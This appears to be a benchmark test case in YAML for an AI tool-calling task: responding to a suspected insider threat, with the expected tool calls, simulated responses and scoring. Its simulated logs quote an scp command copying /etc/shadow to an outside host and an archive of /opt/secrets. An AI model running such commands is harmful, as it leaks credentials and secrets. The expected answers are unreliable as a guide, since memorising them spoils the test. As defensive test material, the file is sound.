@@ -1,0 +1,130 @@
+name: incident_response
+tier: 3
+category: tool_calling
+description: Full incident response — logs, metrics, user lookup, ARP check, ticket, notification, remediation script
+
+prompt: "We suspect an insider threat on the internal network. Check the auth logs on jump-01 for suspicious activity, pull system metrics, look up user bwilson who triggered the alert, check the ARP table on switch-core-01 for their workstation MAC, create a critical security ticket, send an alert to #security-ops on Slack, and run the forensic snapshot script /opt/scripts/forensic_capture.sh on jump-01."
+
+available_tools:
+  - check_logs
+  - get_metrics
+  - lookup_user
+  - get_arp_table
+  - create_ticket
+  - send_notification
+  - run_script
+  - ping_host
+  - dns_lookup
+  - traceroute
+  - check_port
+  - check_service_status
+  - restart_service
+  - query_database
+  - update_firewall_rule
+  - whois_lookup
+  - subnet_calculator
+  - manage_dns_record
+
+expected_tool_calls:
+  - tool: check_logs
+    params:
+      service: sshd
+      severity: warning
+      host: jump-01
+  - tool: get_metrics
+    params:
+      host: jump-01
+      metric_type: all
+  - tool: lookup_user
+    params:
+      username: bwilson
+  - tool: get_arp_table
+    params:
+      host: switch-core-01
+  - tool: create_ticket
+    params:
+      title: "Security alert — suspected insider threat involving bwilson"
+      description: "Insider threat investigation triggered by suspicious activity from user bwilson on jump-01. Auth logs show unauthorized access patterns. Forensic capture initiated."
+      priority: critical
+  - tool: send_notification
+    params:
+      channel: slack
+      recipient: "#security-ops"
+      message: "SECURITY ALERT: Suspected insider threat — user bwilson flagged for suspicious activity on jump-01. Forensic capture in progress. Critical ticket created."
+      urgency: critical
+  - tool: run_script
+    params:
+      command: "/opt/scripts/forensic_capture.sh"
+      host: jump-01
+      sudo: true
+
+simulated_responses:
+  check_logs:
+    entries:
+      - timestamp: "2026-03-30T13:30:00Z"
+        level: warning
+        message: "Accepted publickey for bwilson from 10.0.8.45 port 49221"
+      - timestamp: "2026-03-30T13:32:00Z"
+        level: warning
+        message: "User bwilson executed: scp -r /etc/shadow bwilson@external-host.com:"
+      - timestamp: "2026-03-30T13:33:00Z"
+        level: error
+        message: "User bwilson attempted access to /root — permission denied"
+      - timestamp: "2026-03-30T13:35:00Z"
+        level: warning
+        message: "User bwilson executed: tar czf /tmp/data_dump.tar.gz /opt/secrets/"
+    total_count: 28
+  get_metrics:
+    host: jump-01
+    metric_type: all
+    data:
+      cpu_percent: 45.2
+      memory_percent: 62.1
+      network_tx_mbps: 85.4
+      network_rx_mbps: 2.1
+      disk_usage_percent: 55.0
+      note: "Unusually high outbound network traffic"
+  lookup_user:
+    username: bwilson
+    full_name: "Brian Wilson"
+    email: "brian.wilson@company.com"
+    department: "IT Operations"
+    title: "Systems Administrator"
+    manager: "klee"
+    status: active
+    last_login: "2026-03-30T13:29:55Z"
+  get_arp_table:
+    host: switch-core-01
+    entries:
+      - ip: "10.0.8.45"
+        mac: "aa:bb:cc:11:22:33"
+        interface: "eth2"
+        state: "REACHABLE"
+      - ip: "10.0.8.1"
+        mac: "aa:bb:cc:00:00:01"
+        interface: "eth2"
+        state: "REACHABLE"
+    total_entries: 2
+  create_ticket:
+    ticket_id: "SEC-20260330-0010"
+    status: created
+    priority: critical
+    created_at: "2026-03-30T14:50:00Z"
+  send_notification:
+    status: sent
+    channel: slack
+    recipient: "#security-ops"
+    timestamp: "2026-03-30T14:50:05Z"
+  run_script:
+    status: success
+    exit_code: 0
+    stdout: "Forensic capture started on jump-01\nCapturing memory dump... done (4.2 GB)\nCapturing disk image of /tmp... done\nCapturing network connections... done\nCapturing process list... done\nArtifacts saved to /forensics/jump-01-20260330/"
+    stderr: ""
+    duration_seconds: 180
+
+scoring:
+  correct_tool: 5
+  correct_params: 3
+  correct_ordering: 3
+  parallel_calls: 2
+  no_hallucinated_tools: 2
